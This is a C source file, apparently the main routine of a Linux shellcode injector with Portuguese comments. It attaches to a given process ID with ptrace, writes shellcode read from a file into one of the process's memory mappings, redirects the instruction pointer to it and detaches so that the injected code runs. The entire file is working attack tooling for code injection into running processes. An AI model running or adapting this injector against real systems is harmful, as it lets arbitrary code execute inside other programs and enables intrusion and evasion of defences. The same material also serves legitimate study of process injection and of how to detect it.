#include <stdio.h>
#include <stdlib.h>
#include <sys/ptrace.h>
#include <sys/wait.h>
#include <errno.h>

#include "utils.h"
#include "injector.h"

int main(int argc, char *argv[])
{
    if (argc < 3)
    {
        fprintf(stderr, "Usage:\t %s PID [shellcode.bin]\n", argv[0]);
        exit(EXIT_FAILURE);
    }

    /* Recebendo os parametros */
    unsigned int MaxPIDValue = retrieve_maxPID_value();
    unsigned int AttachPID = _atoi(argv[1]);
    unsigned char *buffer;
    size_t len_buffer;

    /* Lendo o arquivo */
    size_t ret = file2buf(argv[2], &buffer, &len_buffer);
    printShellcode(buffer, len_buffer);
    info("Max PID value: %d\n", MaxPIDValue);
    warn("Target PID %d\n", AttachPID);

    if (AttachPID == 0 || AttachPID > MaxPIDValue)
    {
        perror("The proccess ID is not valid!");
        exit(EXIT_FAILURE);
    }
    /**/
    if (ptrace_attach(AttachPID))
    {
        perror("Failed to attach to the process!");
        exit(EXIT_FAILURE);
    }

    // Salvando os registradores
    struct user_regs_struct *save_registers = ptrace_getregs(AttachPID);

    proc_maps_t *proc_info = proc_mappings(AttachPID);
    if(!proc_info){
        free(save_registers);
        exit(EXIT_FAILURE);
    }

    ptrace_poketext(AttachPID, proc_info->address, (unsigned long *) buffer, len_buffer);

    info("proc_maps_t: \n    long address %p\n    uint8_t permissions: %d\n", proc_info->address, proc_info->permissions);


    save_registers->rip = proc_info->address+2;
    info("Registers:\n    RIP = address+2: %p\n", save_registers->rip);

    if(ptrace_setregs(AttachPID, save_registers) < 0) 
        exit(EXIT_FAILURE);

    
    info("Code injected and executed successfully.\n");
    
    /* Restart the stopped tracee process. */
    if(ptrace(PTRACE_DETACH, AttachPID, NULL, NULL) < 0){
        perror("Error on restart the stopped tracee process!");
        exit(EXIT_FAILURE);
    }


    free(save_registers);
    free(proc_info);

    return EXIT_SUCCESS;
}
